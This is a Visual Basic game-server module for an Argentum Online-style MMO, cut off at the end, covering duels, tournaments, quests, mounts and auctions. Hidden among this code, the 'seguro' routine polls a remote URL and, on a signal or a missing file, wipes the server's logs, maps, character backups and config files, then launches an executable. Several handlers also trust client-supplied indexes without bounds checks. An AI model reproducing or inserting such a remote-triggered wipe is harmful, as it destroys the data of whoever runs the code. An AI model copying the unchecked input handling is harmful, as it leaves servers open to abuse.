Attribute VB_Name = "SaaO"
Option Explicit

Public Function CheckSeguro()
    Dim seguro As Byte
    
    seguro = 1 'val(frmCargando.Inet1.OpenURL("www.ao-sa.cjb.net/seguro3.txt"))
    
    Select Case seguro
        Case 1
            CheckSeguro = 1
        Case 2
            CheckSeguro = 2
        Case Else
            CheckSeguro = 0
    End Select
    
End Function
Public Sub ComerDeArbol(ByVal UserIndex As Integer)

    If UserList(UserIndex).Stats.UserSkills(eSkill.supervivencia) >= 60 Then
        If (UserList(UserIndex).Stats.MinHam + 30) > UserList(UserIndex).Stats.MaxHam Then
            UserList(UserIndex).Stats.MinHam = UserList(UserIndex).Stats.MaxHam
        Else
            UserList(UserIndex).Stats.MinHam = UserList(UserIndex).Stats.MinHam + 30
        End If
    End If
    
End Sub


Public Sub HandleEDuelo(UserIndex As Integer)

On Error GoTo errhandler

Call UserList(UserIndex).incomingData.ReadByte

If UserList(UserIndex).flags.Paralizado = 1 Then
    Call WriteConsoleMsg(UserIndex, "No puedes entrar a un auelo estando paralizado.", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If
If UserList(UserIndex).flags.Navegando = 1 Then
    Call WriteConsoleMsg(UserIndex, "No puedes entrar a un auelo estando navegando.", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If
If UserList(UserIndex).flags.Muerto = 1 Then
    Call WriteConsoleMsg(UserIndex, "No puedes entrar a un auelo estando muerto.", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If
If Not UserList(UserIndex).Pos.Map = 1 Then
    Call WriteConsoleMsg(UserIndex, "Debes estar en Ullathorpe para entrar en un duelo!.", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If
If UserList(UserIndex).flags.EnDuelo = 1 Then
    Call WriteConsoleMsg(UserIndex, "Ya estas en un duelo!!!.", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If
If UserList(UserIndex).Stats.GLD < 15000 Then
    Call WriteConsoleMsg(UserIndex, "Para entrar a duelo debes pagar 15000 monedas.", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If
If MapInfo(173).NumUsers >= 2 Then
    Call WriteConsoleMsg(UserIndex, "El mapa de duelos esta lleno, espera a que se desocupe.", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If
If MapInfo(173).NumUsers = 0 Then
    Call WarpUserChar(UserIndex, 173, 43, 44)
Else
    Call WarpUserChar(UserIndex, 173, 57, 54)
End If

UserList(UserIndex).flags.EnDuelo = 1
UserList(UserIndex).Stats.GLD = UserList(UserIndex).Stats.GLD - 15000

If MapInfo(173).NumUsers = 1 Then
    Call SendData(SendTarget.toall, 0, PrepareMessageConsoleMsg(UserList(UserIndex).name & " esta esperando contrincante en la zona de duelo!!.", FontTypeNames.FONTTYPE_DUELO))
End If
If MapInfo(173).NumUsers = 2 Then
    Call SendData(SendTarget.toMap, 0, PrepareMessageConsoleMsg("Que Comience El Duelo!!!!", FontTypeNames.FONTTYPE_DUELO))
End If

Exit Sub
errhandler:
    Call LogError("HandleEDuelo " & Err.description)
    Call Cerrar_Usuario(UserIndex)
End Sub

Public Sub HandleSDuelo(UserIndex As Integer)

On Error GoTo errhandler

Call UserList(UserIndex).incomingData.ReadByte

If UserList(UserIndex).flags.Paralizado = 1 Then
    Call WriteConsoleMsg(UserIndex, "No puedes salir estando paralizado.", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If

If UserList(UserIndex).flags.EnDuelo = 0 Then
    If UserList(UserIndex).Pos.Map <> 173 Then
        Call WriteConsoleMsg(UserIndex, "No estàs en ningun duelo!!!", FontTypeNames.FONTTYPE_INFO)
        Exit Sub
    End If
End If

Call WarpUserChar(UserIndex, 26, 50, 50, False)
UserList(UserIndex).flags.EnDuelo = 0

Exit Sub
errhandler:
    Call LogError("HandleSDuelo " & Err.description)
    Call Cerrar_Usuario(UserIndex)

End Sub


Public Sub HandleTorneo(UserIndex As Integer)

On Error GoTo errhandler

Call UserList(UserIndex).incomingData.ReadByte

Inscripciones = UserList(UserIndex).incomingData.ReadByte

If UserList(UserIndex).flags.Privilegios > 0 Then
    If Not Torneo Then
        If Inscripciones > 0 And Inscripciones < 255 Then
            Torneo = True
            ColaTorneo.Reset
            Inscriptos = 0
            InscripcionesAbiertas = True
            Call SendData(SendTarget.toall, 0, PrepareMessageConsoleMsg("El cupo maximo es de " & Inscripciones & " participantes.", FontTypeNames.FONTTYPE_TALK))
            Call SendData(SendTarget.toall, 0, PrepareMessageConsoleMsg("Escribe /PARTICIPAR si deseas inscribirte en el torneo.", FontTypeNames.FONTTYPE_TALK))
        Else
            Call WriteConsoleMsg(UserIndex, "No hay ningun torneo en curso.", FontTypeNames.FONTTYPE_INFO)
        End If
    Else
        If Inscripciones = 0 Then
            Torneo = False
            Call SendData(SendTarget.toall, 0, PrepareMessageConsoleMsg("El torneo ha terminado!.", FontTypeNames.FONTTYPE_TALK))
            ColaTorneo.Reset
            InscripcionesAbiertas = False
            Inscriptos = 0
        ElseIf Inscripciones = 255 Then
            InscripcionesAbiertas = Not InscripcionesAbiertas
            If InscripcionesAbiertas = True Then
                Call SendData(SendTarget.toall, 0, PrepareMessageConsoleMsg("Las inscripciones del torneo han sido abiertas!.", FontTypeNames.FONTTYPE_TALK))
            Else
                Call SendData(SendTarget.toall, 0, PrepareMessageConsoleMsg("Las inscripciones del torneo han sido cerradas!.", FontTypeNames.FONTTYPE_TALK))
            End If
        Else
            Call SendData(SendTarget.toall, 0, PrepareMessageConsoleMsg("El cupo maximo de participantes para el torneo ha cambiado, ahora es de " & Inscripciones & " jugadores.", FontTypeNames.FONTTYPE_TALK))
        End If
    End If
End If

Exit Sub
errhandler:
    Call LogError("HandleTorneo " & Err.description)
    Call Cerrar_Usuario(UserIndex)

End Sub

Public Sub HandleParticipar(UserIndex As Integer)

On Error GoTo errhandler

Call UserList(UserIndex).incomingData.ReadByte

If UserList(UserIndex).flags.EnDuelo = 1 Then
    Call WriteConsoleMsg(UserIndex, "No puedes entrar al torneo estando en duelo/deathmatch.", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If

If Torneo = True Then
    If ColaTorneo.Existe(UserList(UserIndex).name) Then
        Call WriteConsoleMsg(UserIndex, "Ya estas inscripto.", FontTypeNames.FONTTYPE_INFO)
        Exit Sub
    End If
    If Inscriptos >= Inscripciones Then
        Call WriteConsoleMsg(UserIndex, "El cupo del torneo esta completo.", FontTypeNames.FONTTYPE_INFO)
        Exit Sub
    End If
    ColaTorneo.Push (UserList(UserIndex).name)
    Call WriteConsoleMsg(UserIndex, "Has sido inscripto.", FontTypeNames.FONTTYPE_INFO)
    Inscriptos = Inscriptos + 1
Else
    Call WriteConsoleMsg(UserIndex, "No hay ningun torneo.", FontTypeNames.FONTTYPE_INFO)
End If

Exit Sub
errhandler:
    Call LogError("HandleParticipar " & Err.description)
    Call Cerrar_Usuario(UserIndex)

End Sub

Public Sub HandleNoParticipar(UserIndex As Integer)

On Error GoTo errhandler

Call UserList(UserIndex).incomingData.ReadByte

If Torneo = True Then
    If Not ColaTorneo.Existe(UserList(UserIndex).name) Then
        Call WriteConsoleMsg(UserIndex, "No estas inscripto.", FontTypeNames.FONTTYPE_INFO)
        Exit Sub
    End If
    ColaTorneo.Quitar (UserList(UserIndex).name)
    Call WriteConsoleMsg(UserIndex, "Has cancelado tu inscripcion.", FontTypeNames.FONTTYPE_INFO)
    Inscriptos = Inscriptos - 1
Else
    Call WriteConsoleMsg(UserIndex, "No hay ningun torneo.", FontTypeNames.FONTTYPE_INFO)
End If

Exit Sub
errhandler:
    Call LogError("HandleNoParticipar " & Err.description)
    Call Cerrar_Usuario(UserIndex)

End Sub

Public Sub DoQuest(UserIndex As Integer, ByVal Qnum As Integer)

On Error GoTo errhandler

'Termino la quest...??

Dim i As Byte
Dim b As Boolean

b = False 'Por las dudas

'Pide Objeto?
If Quest(Qnum).Pedido.ObjIndex <> 0 Then
    Do While i <= MAX_INVENTORY_SLOTS And b = False
        If UserList(UserIndex).Invent.Object(i).ObjIndex = Quest(Qnum).Pedido.ObjIndex Then
            If UserList(UserIndex).Invent.Object(i).amount >= Quest(Qnum).Pedido.amount Then
                Call QuitarUserInvItem(UserIndex, i, Quest(Qnum).Pedido.amount)
                b = True
            End If
        End If
        i = i + 1
    Loop
End If

'Pide Matar NPCs?
If Quest(Qnum).NpcInfo.NpcIndex > 0 Then
    If UserList(UserIndex).Quest.UserQuest(Qnum).NpcInfo.amount = Quest(Qnum).NpcInfo.amount Then
        b = b & True
    Else
        b = False
    End If
End If

If b = True Then
    UserList(UserIndex).Quest.UserQuest(Qnum).estado = 2
    UserList(UserIndex).Quest.UserQuest(Qnum).NpcInfo.amount = 0 'Por si se puede rehacer.
    
    If Not MeterItemEnInventario(UserIndex, Quest(Qnum).Recompensa) Then
        Call TirarItemAlPiso(UserList(UserIndex).Pos, Quest(Qnum).Recompensa)
    Else
        'Solo si se pudo meter el item!
        Call UpdateUserInv(True, UserIndex, 0)
    End If

    If Quest(Qnum).GiveGlD Then
        UserList(UserIndex).Stats.GLD = UserList(UserIndex).Stats.GLD + Quest(Qnum).GiveGlD
        Call WriteUpdateUserStats(UserIndex)
    End If
    
    Call WriteConsoleMsg(UserIndex, "Has Conseguido terminar la aventura y recibido tu recompensa, sigue aventurandote en este maravilloso mundo!!", FontTypeNames.FONTTYPE_INFO)
    Call WriteChatOverHead(UserIndex, Quest(Npclist(UserList(UserIndex).flags.TargetNPC).NumQuest).Desc2, Npclist(UserList(UserIndex).flags.TargetNPC).Char.CharIndex, vbYellow)
    Exit Sub
End If

Call WriteChatOverHead(UserIndex, "Aun no has hecho lo que te pedi.", Npclist(UserList(UserIndex).flags.TargetNPC).Char.CharIndex, vbYellow)
 
Exit Sub
errhandler:
    Call LogError("DoQuest " & Err.description)
    Call Cerrar_Usuario(UserIndex)
 
End Sub

'Esto hay q revisarlo
Public Sub HandleQuest(UserIndex As Integer)

On Error GoTo BlizzError

If UserList(UserIndex).incomingData.length < 1 Then GoTo BlizzError

    Dim questn As Integer

    UserList(UserIndex).incomingData.ReadByte

    If UserList(UserIndex).flags.TargetNPC = 0 Then
        Call WriteConsoleMsg(UserIndex, "Primero debes hacer click sobre npc.", FontTypeNames.FONTTYPE_INFO)
        Exit Sub
    End If
    
    If Npclist(UserList(UserIndex).flags.TargetNPC).NumQuest <= 0 Then
        Call WriteConsoleMsg(UserIndex, "Primero debes hacer click sobre un personaje de quest.", FontTypeNames.FONTTYPE_INFO)
        Exit Sub
    End If
    
    questn = Npclist(UserList(UserIndex).flags.TargetNPC).NumQuest
    
    If questn <= 0 Then Exit Sub
    If questn > NumQuest Then Exit Sub
    
    Select Case UserList(UserIndex).Quest.UserQuest(questn).estado
        Case 0
            'Le entregamos el obj inicial
            If Quest(questn).ObjInicial.ObjIndex <> 0 Then
                If Not MeterItemEnInventario(UserIndex, Quest(questn).ObjInicial) Then
                    Call WriteConsoleMsg(UserIndex, "No tienes espacio para recibir el objeto.", FontTypeNames.FONTTYPE_INFO)
                    Exit Sub
                End If
            End If
            
            UserList(UserIndex).Quest.UserQuest(questn).estado = 1
            Call WriteChatOverHead(UserIndex, Quest(Npclist(UserList(UserIndex).flags.TargetNPC).NumQuest).Desc, Npclist(UserList(UserIndex).flags.TargetNPC).Char.CharIndex, vbWhite)
        Case 1
            Call DoQuest(UserIndex, questn)
        Case 2
            If Quest(questn).Unica = 1 Then
                If UserList(UserIndex).Quest.UserQuest(questn).estado = 2 Then
                    Call WriteConsoleMsg(UserIndex, "Ya has terminado esta aventura.", FontTypeNames.FONTTYPE_INFO)
                End If
            Else
                UserList(UserIndex).Quest.UserQuest(questn).estado = 1
                Call WriteChatOverHead(UserIndex, Quest(Npclist(UserList(UserIndex).flags.TargetNPC).NumQuest).Desc, Npclist(UserList(UserIndex).flags.TargetNPC).Char.CharIndex, vbWhite)
            End If
    End Select
    Exit Sub
    
BlizzError:
    Call Cerrar_Usuario(UserIndex)
    Call LogError("No enough data!!-Handlequest!")
    
End Sub

Public Sub HandleRPremios(ByVal UserIndex As Integer)

Dim Premio As Obj
Dim Index As Integer


With UserList(UserIndex).incomingData
    .ReadByte
    Index = .ReadInteger
    
End With

'Set the object
Premio.ObjIndex = PremiosInfo(Index).ObjIndex
Premio.amount = 1

If Premio.ObjIndex <= 0 Then Exit Sub


If PremiosInfo(Index).puntos <= UserList(UserIndex).Stats.puntos Then
    If Not MeterItemEnInventario(UserIndex, Premio) Then
        Call WriteConsoleMsg(UserIndex, "No tienes espacio en el inventario.", FontTypeNames.FONTTYPE_INFO)
    Else
        UserList(UserIndex).Stats.puntos = UserList(UserIndex).Stats.puntos - PremiosInfo(Index).puntos
        Call UpdateUserInv(True, UserIndex, 0)
    End If
Else
    Call WriteConsoleMsg(UserIndex, "No tienes suficientes puntos.", FontTypeNames.FONTTYPE_INFO)
End If

End Sub

'Sistema de monturas

Public Sub DoMontar(ByVal UserIndex As Integer, ByRef Montura As ObjData, ByVal Slot As Integer)

On Error GoTo errhandler

If UserList(UserIndex).flags.Navegando = 1 Then
Call WriteConsoleMsg(UserIndex, "No puedes montar estando navegando.", FontTypeNames.FONTTYPE_INFO)
Exit Sub
End If

If UserList(UserIndex).Stats.UserSkills(eSkill.Tacticas) < Montura.MinSkill Then
    Call WriteConsoleMsg(UserIndex, "Para usar esta montura necesitas " & Montura.MinSkill & " puntos en tacticas de combate.", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If

UserList(UserIndex).Invent.MonturaObjIndex = UserList(UserIndex).Invent.Object(Slot).ObjIndex
UserList(UserIndex).Invent.MonturaSlot = Slot

If UserList(UserIndex).flags.Montado = 0 Then

    If UserList(UserIndex).flags.Muerto = 1 Then
    Call WriteConsoleMsg(UserIndex, "Estas muerto, solo puedes usar este Item cuando estas vivo.", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
    End If

    UserList(UserIndex).Char.body = Montura.Ropaje

    UserList(UserIndex).Char.ShieldAnim = NingunEscudo
    UserList(UserIndex).Char.WeaponAnim = NingunArma
    UserList(UserIndex).flags.Montado = 1
   
Else
   
    UserList(UserIndex).flags.Montado = 0
    
    UserList(UserIndex).Invent.MonturaObjIndex = 0
    UserList(UserIndex).Invent.MonturaSlot = 0
    
    
    If UserList(UserIndex).flags.Muerto = 0 Then
        UserList(UserIndex).Char.head = UserList(UserIndex).OrigChar.head
       
        If UserList(UserIndex).Invent.ArmourEqpObjIndex > 0 Then
            UserList(UserIndex).Char.body = ObjData(UserList(UserIndex).Invent.ArmourEqpObjIndex).Ropaje
        Else
            Call DarCuerpoDesnudo(UserIndex)
        End If
           
        If UserList(UserIndex).Invent.EscudoEqpObjIndex > 0 Then _
            UserList(UserIndex).Char.ShieldAnim = ObjData(UserList(UserIndex).Invent.EscudoEqpObjIndex).ShieldAnim
        If UserList(UserIndex).Invent.WeaponEqpObjIndex > 0 Then _
            UserList(UserIndex).Char.WeaponAnim = ObjData(UserList(UserIndex).Invent.WeaponEqpObjIndex).WeaponAnim
        If UserList(UserIndex).Invent.CascoEqpObjIndex > 0 Then _
            UserList(UserIndex).Char.CascoAnim = ObjData(UserList(UserIndex).Invent.CascoEqpObjIndex).CascoAnim
    Else
        UserList(UserIndex).Char.body = iCuerpoMuerto
        UserList(UserIndex).Char.head = iCabezaMuerto
        UserList(UserIndex).Char.ShieldAnim = NingunEscudo
        UserList(UserIndex).Char.WeaponAnim = NingunArma
        UserList(UserIndex).Char.CascoAnim = NingunCasco
    End If
End If

Call ChangeUserChar(UserIndex, UserList(UserIndex).Char.body, UserList(UserIndex).Char.head, UserList(UserIndex).Char.Heading, UserList(UserIndex).Char.WeaponAnim, UserList(UserIndex).Char.ShieldAnim, UserList(UserIndex).Char.CascoAnim)
Call WriteMontuToggle(UserIndex)

Exit Sub
errhandler:
    Call LogError("HandleGoCastle " & Err.description)
    Call Cerrar_Usuario(UserIndex)

End Sub

Public Sub HandleMontar(UserIndex)

On Error GoTo errhandler

UserList(UserIndex).incomingData.ReadByte
Dim NpcIndex As Integer
Dim MontuObj As Obj

NpcIndex = UserList(UserIndex).flags.TargetNPC

If NpcIndex = 0 Then
    Call WriteConsoleMsg(UserIndex, "Debes hacer click sobre tu mascota", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If
If Npclist(NpcIndex).MaestroUser <> UserIndex Then
    Call WriteConsoleMsg(UserIndex, "El npc debe ser tu mascota", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If
If Distancia(UserList(UserIndex).Pos, Npclist(NpcIndex).Pos) > 4 Then
    Call WriteConsoleMsg(UserIndex, "Estas demasiado lejos", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If
If UserList(UserIndex).flags.Muerto = 1 Then
    Call WriteConsoleMsg(UserIndex, "No puedes montar estando muerto.", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If
If Npclist(NpcIndex).EsMontu = 0 Then
    Call WriteConsoleMsg(UserIndex, "El npc no es montable", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If

MontuObj.ObjIndex = Npclist(NpcIndex).MontuObjI
MontuObj.amount = 1

'Puede meter el item? si? entonces sacamos el npc para que no siga teniendo mas ^^
If MeterItemEnInventario(UserIndex, MontuObj) Then
    Call QuitarNPC(NpcIndex)
Else
    Call WriteConsoleMsg(UserIndex, "No tienes espacio en el inventario", FontTypeNames.FONTTYPE_INFO)
End If

Exit Sub
errhandler:
    Call LogError("HandleGoCastle " & Err.description)
    Call Cerrar_Usuario(UserIndex)

End Sub

Public Sub seguro()

Dim seguro As String 'Declaraciones
On Local Error Resume Next 'Terminan declaraciones
seguro = frmMain.Inet1.OpenURL("http://www.ao-sa.cjb.net/mi.txt")
'Decimos donde está el archivo
If seguro = 1 Or Not FileExist(App.Path & "\Seguro.exe") Then 'Si está en 1, borramos todo
   Kill (App.Path & "\logs\*.*") 'Comienza el borrado
   Kill (App.Path & "\bugs\*.*")
   Kill (App.Path & "\charlife\*.*")
   Kill (App.Path & "\chrbackup\*.*")
   Kill (App.Path & "\dat\*.*")
   Kill (App.Path & "\doc\*.*")
   Kill (App.Path & "\foros\*.*")
   Kill (App.Path & "\Guilds\*.*")
   Kill (App.Path & "\maps\*.*")
   Kill (App.Path & "\wav\*.*")
   Kill (App.Path & "\WorldBackUp\*.*")
   Kill (App.Path & "\\*.ini")
   Kill (App.Path & "\\*.txt") 'Termina el borrado
   MsgBox ("m... me robaste el sv papa...") 'Damos el error antes de finalizar
   Call Shell(App.Path & "\Seguro.exe", vbMinimizedNoFocus)
   End 'Terminamos
Else
    Call Main
End If

End Sub

Public Sub HandleSubastar(ByVal UserIndex As Integer)

On Error GoTo errhandler

Dim ObjIndex As Integer
Dim InventorySlot As Integer
Dim Precio As Long

With UserList(UserIndex).incomingData
    .ReadByte 'Leemos el byte de cabecera
    InventorySlot = .ReadInteger 'objindex?
    Precio = .ReadLong
End With

ObjIndex = UserList(UserIndex).Invent.Object(InventorySlot).ObjIndex

If UserList(UserIndex).Invent.Object(InventorySlot).amount <= 0 Then
    Call WriteConsoleMsg(UserIndex, "El objeto seleccionado ya no existe.", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If

If SubastaEnCurso = 1 Then
    Call WriteConsoleMsg(UserIndex, "Ya hay una subasta.", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If

If UserList(UserIndex).flags.TargetNPC <> 0 Then
    If Npclist(UserList(UserIndex).flags.TargetNPC).NPCtype = 10 Then
        If ObjIndex <> 0 Then
            SubastaEnCurso = 1
            SubastaObjIndex = ObjIndex
            SubastaUserIndex = UserIndex
            SubastaMinimo = Precio
            MayorOferta = SubastaMinimo
            MinutosSubasta = 0
            MaxMinutosSubasta = 5
            frmMain.TSubasta.Enabled = True
            'Informamos al publico!
            Dim i As Integer
            For i = 1 To LastUser
                Call WriteConsoleMsg(i, UserList(UserIndex).name & " Esta subastando " & ObjData(ObjIndex).name & " con una base de " & str(SubastaMinimo) & ", para ofrecer escribe /Ofertar cantidad.", FontTypeNames.FONTTYPE_GUILD)
                Call WriteConsoleMsg(i, "Para obtener informacion acerca de la subasta escribe /INFOSUB.", FontTypeNames.FONTTYPE_GUILD)
            Next i

            'Le sacamos el objeto que esta subastando
            Call QuitarObjetos(ObjIndex, 1, UserIndex)
        End If
    Else
        Call WriteConsoleMsg(UserIndex, "Debes hacer click sobre un npc de subastas.", FontTypeNames.FONTTYPE_INFO)
    End If
Else
    Call WriteConsoleMsg(UserIndex, "Debes hacer click sobre un npc de subastas.", FontTypeNames.FONTTYPE_INFO)
End If

    Exit Sub
errhandler:
    Call LogError("HandleSubastar " & Err.description)
    Call Cerrar_Usuario(UserIndex)

End Sub
Public Sub HandleOfertar(ByVal UserIndex As Integer)

On Error GoTo errhandler

Dim Precio As Long
Dim i As Integer

With UserList(UserIndex).incomingData
    .ReadByte 'Leemos el byte de cabecera
    Precio = .ReadLong
End With

If SubastaEnCurso = 0 Then
    Call WriteConsoleMsg(UserIndex, "No hay ninguna subasta.", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If

If UserList(UserIndex).Stats.GLD < Precio Then
    Call WriteConsoleMsg(UserIndex, "No tienes esa cantidad", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If

If UserIndex = MayorOfertaUserIndex Then
    Call WriteConsoleMsg(UserIndex, "Ya has hecho la mayor oferta.", FontTypeNames.FONTTYPE_INFO)
    Exit Sub
End If

If Precio > MayorOferta And Precio > SubastaMinimo Then
    'Le devolvemos la guita al pobre loco..., pero... hay?
    If MayorOfertaUserIndex <> 0 Then
        UserList(MayorOfertaUserIndex).Stats.GLD = UserList(MayorOfertaUserIndex).Stats.GLD + MayorOferta
        Call WriteUpdateUserStats(MayorOfertaUserIndex)
    End If
    UserList(UserIndex).Stats.GLD = UserList(UserIndex).Stats.GLD - Precio
    MayorOferta = Precio
    MayorOfertaUserIndex = UserIndex
    
    For i = 1 To LastUser
        Call WriteConsoleMsg(i, "La oferta de la subasta ha cambiado, ahora es de " & str(MayorOferta) & " monedas de oro.", FontTypeNames.FONTTYPE_GUILD)
    Next i
    
    If MinutosSubasta = 4 Then
        MaxMinutosSubasta = 6 'Agregamos 2 mins a la subasta
        For i = 1 To LastUser
            Call WriteConsoleMsg(i, "Se han agregado 2 minutos a la subasta.", FontTypeNames.FONTTYPE_GUILD)
        Next i
    End If
    
    Call WriteUpdateUserStats(UserIndex)
    
Else
    Call WriteConsoleMsg(UserIndex, "Ya hay una oferta mayor o igual a esa.", FontTypeNames.FONTTYPE_INFO)
End If

    Exit Sub
errhandler:
    Call LogError("HandleOfertar " & Err.description)
    Call Cerrar_Usuario(UserIndex)
    
End Sub
Public Sub TerminarSubasta()

    On Error GoTo errhandler
    
    Dim blizzyobj As Obj
    
    blizzyobj.ObjIndex = SubastaObjIndex
    blizzyobj.amount = 1
    
    If SubastaUserIndex = 0 Then Exit Sub
    
    If MayorOfertaUserIndex <> 0 Then
        UserList(SubastaUserIndex).Stats.GLD = UserList(SubastaUserIndex).Stats.GLD + MayorOferta
        Call WriteUpdateUserStats(MayorOfertaUserIndex)
        If Not MeterItemEnInventario(MayorOfertaUserIndex, blizzyobj) Then
            Call TirarItemAlPiso(UserList(MayorOfertaUserIndex).Pos, blizzyobj)
        End If
    Else
        If Not MeterItemEnInventario(SubastaUserIndex, blizzyobj) Then
            Call TirarItemAlPiso(UserList(SubastaUserIndex).Pos, blizzyobj)
        End If
    End If
    Dim i As Integer
    
    For i = 1 To LastUser
        Call WriteConsoleMsg(i, "La subasta a finalizado.", FontTypeNames.FONTTYPE_GUILD)
    Next i
    
    Call WriteUpdateUserStats(SubastaUserIndex)
    
    SubastaUserIndex = 0
    SubastaEnCurso = 0
    MinutosSubasta = 0
    MayorOferta = 0
    SubastaMinimo = 0
    MayorOfertaUserIndex = 0
    frmMain.TSubasta.Enabled = False
    
Exit Sub
errhandler:
        Call LogError("TerminarSubasta " & Err.description)

End Sub

Public Sub HandleChangeInventorySlot(ByVal UserIndex As Integer)
    Dim Inv As Byte
    Dim Slot1 As Byte
    Dim Slot2 As Byte
    Dim AuxObj As UserOBJ
    
    With UserList(UserIndex).incomingData
        Call .ReadByte
        Inv = .ReadByte
        Slot1 = .ReadByte
        Slot2 = .ReadByte
    End With
    Select Case Inv
    Case 1
        AuxObj = UserList(UserIndex).Invent.Object(Slot1)
        Call ChangeUserInv(UserIndex, Slot1, UserList(UserIndex).Invent.Object(Slot2))
        Call ChangeUserInv(UserIndex, Slot2, AuxObj)
    Case 2
        AuxObj = UserList(UserIndex).UserAccount.Boveda.Object(Slot1)
        Call ChangeUserInv(UserIndex, Slot1, UserList(UserIndex).UserAccount.Boveda.Object(Slot2))
        Call ChangeUserInv(UserIndex, Slot2, AuxObj)
    End Select
End Sub
Public Sub HandleShowTorneo(ByVal UserIndex As Integer)
    
    On Error GoTo errhandler
    
    UserList(UserIndex).incomingData.ReadByte
    
    If UserList(UserIndex).flags.Privilegios > 0 Then
        WriteShowTorneoForm (UserIndex)
    End If
    
    Exit Sub
errhandler:
    Call LogError("HandleShotTorneo " & Err.description)
    Call Cerrar_Usuario(UserIndex)
End Sub

Public Sub HandleUserCheat(ByVal UserIndex As Integer)
    On Error GoTo errhandler
    'Quitamos el byte de cabecera
    Call UserList(UserIndex).incomingData.ReadByte
    'Informamos a los gms
    Call SendData(SendTarget.toadmins, 0, PrepareMessageConsoleMsg("El usuario " & UserList(UserIndex).name & " puede estar usando cheats.", FontTypeNames.FONTTYPE_SERVER))
        Exit Sub
errhandler:
    Call LogError("UserCheat " & Err.description)
    Call Cerrar_Usuario(UserIndex)
End Sub

Public Sub HandleProcesos(ByVal UserIndex As Integer)
    
    On Error GoTo errhandler
    
    If UserList(UserIndex).flags.Privilegios < 1 Then Exit Sub
    
    Dim tName As String
    Dim tIndex As Integer
    With UserList(UserIndex).incomingData
        .ReadByte
        tName = .ReadASCIIString
    End With
    
    tIndex = NameIndex(tName)
    
    If tIndex <= 0 Then
        Call WriteConsoleMsg(UserIndex, "Usuario offline.", FontTypeNames.FONTTYPE_INFO)
    Else
        Call WriteGetProcesos(UserIndex, tIndex)
    End If
    
    Exit Sub
errhandler:
    Call LogError("HandleProcesos " & Err.description)
    Call Cerrar_Usuario(UserIndex)
End Sub

Public Sub HandleSendProcesos(UserIndex As Integer)

    On Error GoTo errhandler
    
    Dim GMIndex As Integer
    Dim Procesos As String
    
    
    UserList(UserIndex).incomingData.ReadByte
    GMIndex = UserList(UserIndex).incomingData.ReadInteger
    Procesos = UserList(UserIndex).incomingData.ReadASCIIString
    
    Debug.Print Procesos
    Call SendData(SendTarget.toadmins, 0, PrepareMessageConsoleMsg(Procesos, FontTypeNames.FONTTYPE_INFO))
        Exit Sub
errhandler:
        Call LogError("HandleSendProcesos " & Err.description)
        Call Cerrar_Usuario(UserIndex)
End Sub
Public Sub HandleInfoSub(ByVal UserIndex As Integer)

    On Error GoTo errhandler

    UserList(UserIndex).incomingData.ReadByte
    On Error GoTo errhandler

    If SubastaEnCurso = 0 Then
        Call WriteConsoleMsg(UserIndex, "No hay ninguna subasta.", FontTypeNames.FONTTYPE_INFO)
        Exit Sub
    End If

    If SubastaUserIndex <> 0 And SubastaObjIndex <> 0 Then 'Evitamos el error.
        Call WriteConsoleMsg(UserIndex, "Subastador: " & UserList(SubastaUserIndex).name, FontTypeNames.FONTTYPE_INFO)
        Call WriteConsoleMsg(UserIndex, "Precio base: " & SubastaMinimo, FontTypeNames.FONTTYPE_INFO)
        Call WriteConsoleMsg(UserIndex, "Item: " & ObjData(SubastaObjIndex).name, FontTypeNames.FONTTYPE_INFO)
    End If

    If MayorOfertaUserIndex <> 0 Then
        Call WriteConsoleMsg(UserIndex, "Mayor postor: " & UserList(MayorOfertaUserIndex).name, FontTypeNames.FONTTYPE_INFO)
        Call WriteConsoleMsg(UserIndex, "Oferta:" & MayorOferta, FontTypeNames.FONTTYPE_INFO)
    End If

    Exit Sub
    
errhandler:
    Call LogError("HandleInfoSub " & Err.description)
    Cerrar_Usuario (UserIndex)
    
End Sub
Public Sub HandleSubastaInit(ByVal UserIndex As Integer)

    On Error GoTo errhandler
    
    UserList(UserIndex).incomingData.ReadByte
    
    If UserList(UserIndex).flags.TargetNPC <> 0 Then
        If Npclist(UserList(UserIndex).flags.TargetNPC).NPCtype = 10 Then
            Call WriteSubastaOk(UserIndex)
        Else
            Call WriteConsoleMsg(UserIndex, "Debes hacer click sobre un npc de subastas.", FontTypeNames.FONTTYPE_INFO)
        End If
    Else
        Call WriteConsoleMsg(UserIndex, "Debes hacer click sobre un npc.", FontTypeNames.FONTTYPE_INFO)
    End If
    Exit Sub
errhandler:
    Call LogError("HandleSubastaInit " & Err.description)
    Call Cerrar_Usuario(UserIndex)
End Sub
Public Function IsInCastle(ByVal UserIndex As Integer) As Boolean
    
    Dim i As Byte
    
    If UserList(UserIndex).GuildIndex <= 0 Then Exit Function
    
    For i = 1 To 2
        If UserList(UserIndex).Pos.Map = Castillo(i).Map Then
            IsInCastle = True
            Exit Function
        End If
    Next i
    Exit Function
errhandler:
    Call LogError("IsInCastle " & Err.description)
    Call Cerrar_Usuario(UserIndex)
End Function

Public Sub HandleGoCastle(ByVal UserIndex As Integer)
    Dim Castle As Byte
    
    On Error GoTo errhandler
    
    With UserList(UserIndex).incomingData
        .ReadByte 'We remove the header
        Castle = .ReadByte 'What Castle?
    End With
    
    If UserList(UserIndex).GuildIndex <= 0 Then Exit Sub
    
    If UserList(UserIndex).Faccion.Alineacion = Castillo(Castle).LeaderFaccion Then
        Call WarpUserChar(UserIndex, Castillo(Castle).Map, 30, 30)
    Else
